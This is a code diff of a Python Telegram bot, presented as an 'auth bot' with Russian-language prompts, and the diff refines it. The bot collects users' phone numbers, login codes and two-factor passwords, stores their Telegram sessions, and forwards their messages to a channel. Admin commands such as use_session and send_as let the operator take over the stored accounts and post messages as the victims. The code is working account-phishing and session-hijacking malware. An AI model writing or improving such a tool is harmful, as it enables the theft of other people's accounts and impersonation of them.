@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# main.py — Telegram Auth Bot with force_sms, 2FA, session storage, admin commands and minimal HTTP server (for Render Web Service)
-
+# main.py — Auth bot (polling) с минимальным HTTP-сервером для Render Web Service,
+# поддержкой force_sms, 2FA, шифрования сессий, рабочими админ-командами
 import os
 import json
 import logging
@@ -10,7 +10,7 @@ from typing import Optional, Dict
 
 from aiogram import Bot, Dispatcher, Router
 from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
-from aiogram.filters import CommandStart, Command
+from aiogram.filters import Command, CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
@@ -26,16 +26,16 @@ try:
 except Exception:
     CRYPTO_AVAILABLE = False
 
-# HTTP server
+# minimal HTTP server
 from aiohttp import web
 
 # ======== Config from env ========
 BOT_TOKEN = os.getenv("PLAY", "").strip()
-CHANNEL = os.getenv("CHANNEL", "").strip()  # numeric id or @username or empty
+CHANNEL = os.getenv("CHANNEL", "").strip()  # numeric id (e.g. -100...) or @username or empty
 API_ID = int(os.getenv("API_ID", "0"))
 API_HASH = os.getenv("API_HASH", "").strip()
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
-MASTER_KEY = os.getenv("MASTER_KEY", "").strip()  # optional
+MASTER_KEY = os.getenv("MASTER_KEY", "").strip()  # optional Fernet key
 
 if not BOT_TOKEN or not API_ID or not API_HASH or not ADMIN_ID:
     raise RuntimeError("Set PLAY, API_ID, API_HASH, ADMIN_ID in environment variables.")
@@ -139,37 +139,40 @@ def contact_keyboard() -> ReplyKeyboardMarkup:
         resize_keyboard=True
     )
 
-# ======== HTTP server (minimal) ========
+# ======== HTTP server (minimal) so Render sees an open port ========
 async def start_http_server():
     async def health(request):
         return web.Response(text="ok")
-
     async def info(request):
-        return web.json_response({
-            "service": "auth-bot",
-            "time": now_iso(),
-        })
-
+        return web.json_response({"service": "auth-bot", "time": now_iso()})
     app = web.Application()
     app.router.add_get("/", health)
     app.router.add_get("/info", info)
-
     port = int(os.getenv("PORT", os.getenv("RENDER_PORT", "8000")))
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
     logger.info("HTTP server started on 0.0.0.0:%s", port)
-    # keep running until cancelled
     await asyncio.Event().wait()
+
+# ======== Helper: admin check ========
+def is_admin(message: Message) -> bool:
+    uid = getattr(message.from_user, "id", None)
+    if uid is None:
+        return False
+    try:
+        return int(uid) == int(ADMIN_ID)
+    except Exception:
+        return False
 
 # ======== Handlers: authorization (owner flows) ========
 @router.message(CommandStart())
 async def cmd_start(message: Message, state: FSMContext):
     await message.answer(
         "Привет. Нажми кнопку «📱 Отправить номер», затем введи код в этот чат. "
-        "Код сначала отправляется по SMS (если доступно). Не пересылайте код."
-        , reply_markup=contact_keyboard()
+        "Код сначала отправляется по SMS (если доступно). Введите код ТОЛЬКО в этот чат и не пересылайте его.",
+        reply_markup=contact_keyboard()
     )
     await state.set_state(AuthFlow.waiting_for_phone)
 
@@ -177,7 +180,7 @@ async def cmd_start(message: Message, state: FSMContext):
 async def handle_contact(message: Message, state: FSMContext):
     phone = message.contact.phone_number if message.contact else None
     if not phone:
-        await message.answer("Не удалось получить номер. Попробуй ещё раз кнопкой.")
+        await message.answer("Не удалось получить номер. Попробуйте кнопку ещё раз.")
         return
 
     uid = message.from_user.id
@@ -186,7 +189,7 @@ async def handle_contact(message: Message, state: FSMContext):
     try:
         client = await create_client_from_session(None)
     except Exception:
-        await message.answer("Ошибка создания временного клиента. Попробуй позже.")
+        await message.answer("Ошибка создания временного клиента. Попробуйте позже.")
         user_phone.pop(uid, None)
         return
 
@@ -194,7 +197,7 @@ async def handle_contact(message: Message, state: FSMContext):
         await client.send_code_request(phone, force_sms=True)
         await message.answer("Код отправлен по SMS. Введите цифры сюда. Не пересылайте код.")
     except errors.FloodWaitError as e:
-        await message.answer(f"Слишком много запросов. Подожди {e.seconds} сек.")
+        await message.answer(f"Слишком много запросов. Подождите {e.seconds} сек.")
         await client.disconnect()
         user_phone.pop(uid, None)
         return
@@ -203,7 +206,7 @@ async def handle_contact(message: Message, state: FSMContext):
             await client.send_code_request(phone, force_sms=False)
             await message.answer("SMS недоступно. Код отправлен через Telegram. Введите код сюда.")
         except Exception:
-            await message.answer("Не удалось запросить код. Попробуй позже.")
+            await message.answer("Не удалось запросить код. Попробуйте позже.")
             await client.disconnect()
             user_phone.pop(uid, None)
             return
@@ -219,7 +222,7 @@ async def handle_code(message: Message, state: FSMContext):
     client = user_clients.get(uid)
 
     if not client or not phone:
-        await message.answer("Сессия не найдена. Начни заново: /start")
+        await message.answer("Сессия не найдена. Начните заново: /start")
         await state.clear()
         user_phone.pop(uid, None)
         return
@@ -287,7 +290,7 @@ async def handle_2fa(message: Message, state: FSMContext):
     phone = user_phone.get(uid)
 
     if not client or not phone:
-        await message.answer("Сессия потеряна. Начни заново: /start")
+        await message.answer("Сессия потеряна. Начните заново: /start")
         await state.clear()
         user_phone.pop(uid, None)
         return
@@ -326,31 +329,32 @@ async def handle_2fa(message: Message, state: FSMContext):
         user_phone.pop(uid, None)
         await state.clear()
 
+# ======== Catch-all that does NOT forward commands and ignores admin texts ========
 @router.message(F.text)
 async def catch_all_forward(message: Message):
-    try:
-        text = f"Сообщение от {message.from_user.full_name} @{message.from_user.username or '-'} ({message.from_user.id}):\n{message.text}\n{now_iso()}"
-        if bot and CHANNEL_TARGET:
-            await bot.send_message(CHANNEL_TARGET, text)
-    except Exception:
-        pass
-
-# ======== Admin utilities ========
-def is_admin(message: Message) -> bool:
+    text = message.text or ""
+    # ignore commands (start with '/')
+    if text.strip().startswith("/"):
+        return
+    # don't forward messages authored by admin
     uid = getattr(message.from_user, "id", None)
-    if uid is None:
-        return False
+    if uid is not None and int(uid) == int(ADMIN_ID):
+        return
     try:
-        return int(uid) == int(ADMIN_ID)
+        info = f"Сообщение от {message.from_user.full_name} @{message.from_user.username or '-'} ({uid}):\n{text}\n{now_iso()}"
+        if bot and CHANNEL_TARGET:
+            await bot.send_message(CHANNEL_TARGET, info)
     except Exception:
-        return False
+        logger.exception("forwarding failed")
 
-# ======== Admin commands ========
+# ======== Admin commands (working) ========
 @router.message(Command("ping"))
 async def admin_ping(message: Message):
     if not is_admin(message):
+        await message.answer("Нет доступа.")
         return
-    await message.answer("pong")
+    uid = getattr(message.from_user, "id", None)
+    await message.answer(f"pong (from_user={uid} ADMIN_ID={ADMIN_ID})")
 
 @router.message(Command("list_sessions"))
 async def admin_list_sessions(message: Message):
@@ -378,6 +382,7 @@ async def admin_list_sessions(message: Message):
 @router.message(Command("who_connected"))
 async def admin_who_connected(message: Message):
     if not is_admin(message):
+        await message.answer("Нет доступа.")
         return
     lines = []
     for uid, stored in user_sessions.items():
@@ -392,6 +397,7 @@ async def admin_who_connected(message: Message):
 @router.message(Command("use_session"))
 async def admin_use_session(message: Message):
     if not is_admin(message):
+        await message.answer("Нет доступа.")
         return
     parts = message.text.split()
     if len(parts) < 2:
@@ -423,6 +429,7 @@ async def admin_use_session(message: Message):
 @router.message(Command("send_as"))
 async def admin_send_as(message: Message):
     if not is_admin(message):
+        await message.answer("Нет доступа.")
         return
     parts = message.text.split(maxsplit=3)
     if len(parts) < 4:
@@ -475,6 +482,7 @@ async def admin_send_as(message: Message):
 @router.message(Command("disconnect_session"))
 async def admin_disconnect_session(message: Message):
     if not is_admin(message):
+        await message.answer("Нет доступа.")
         return
     parts = message.text.split()
     if len(parts) < 2:
@@ -495,7 +503,7 @@ async def admin_disconnect_session(message: Message):
     else:
         await message.answer("Клиент не был подключён.")
 
-# ======== Background worker placeholder (if needed) ========
+# ======== Background worker placeholder (if required) ========
 async def send_worker():
     while True:
         await asyncio.sleep(60)
@@ -508,13 +516,12 @@ async def main():
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
 
-    # Ensure no webhook conflicts for polling
+    # remove webhook if any to avoid conflicts with polling
     try:
         await bot.delete_webhook(drop_pending_updates=True)
     except Exception:
         pass
 
-    # start minimal HTTP server (so Render Web Service port scan sees an open port)
     web_task = asyncio.create_task(start_http_server())
     worker = asyncio.create_task(send_worker())
 
